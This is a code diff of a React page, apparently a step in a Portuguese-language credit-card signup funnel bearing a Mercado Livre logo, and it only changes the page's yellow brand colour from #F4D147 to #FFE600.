@@ -17,13 +17,13 @@ function Limite() {
 
   return (
     <div className="min-h-screen bg-white flex flex-col relative overflow-hidden">
-      <div className="bg-[#F4D147] w-full py-3 flex justify-center items-center shadow-sm">
+      <div className="bg-[#FFE600] w-full py-3 flex justify-center items-center shadow-sm">
         <img src={mlLogo} alt="Mercado Livre" className="h-9 object-contain" />
       </div>
       <FunnelSteps current={3} />
 
-      <div className="absolute w-72 h-72 rounded-full bg-[#F4D147]/20 -top-20 -right-20 z-0" />
-      <div className="absolute w-56 h-56 rounded-full bg-[#F4D147]/10 -bottom-16 -left-16 z-0" />
+      <div className="absolute w-72 h-72 rounded-full bg-[#FFE600]/20 -top-20 -right-20 z-0" />
+      <div className="absolute w-56 h-56 rounded-full bg-[#FFE600]/10 -bottom-16 -left-16 z-0" />
 
       <main className="flex-1 flex items-start justify-center px-4 py-8 relative z-10">
         <div className="w-full max-w-md bg-white rounded-xl shadow-md p-6 md:p-8">
@@ -34,7 +34,7 @@ function Limite() {
             Saiba como seu limite de crédito pode aumentar ou diminuir
           </p>
 
-          <div className="bg-[#EAF2FE] border-2 border-[#F4D147] rounded-lg p-5 text-center mb-4">
+          <div className="bg-[#EAF2FE] border-2 border-[#FFE600] rounded-lg p-5 text-center mb-4">
             <div className="text-gray-900 font-bold text-lg mb-2">Aumento de Limite</div>
             <p className="text-sm text-gray-700 leading-snug">
               Caso você realize o pagamento das faturas em dia, seu limite será aumentado constantemente.
@@ -50,7 +50,7 @@ function Limite() {
 
           <button
             onClick={() => navigate({ to: "/personalizar" })}
-            className="w-full bg-[#F4D147] hover:bg-[#E5C238] text-gray-900 text-lg font-semibold py-4 rounded-md shadow-md transition-all"
+            className="w-full bg-[#FFE600] hover:bg-[#E6CF00] text-gray-900 text-lg font-semibold py-4 rounded-md shadow-md transition-all"
           >
             Concordo
           </button>
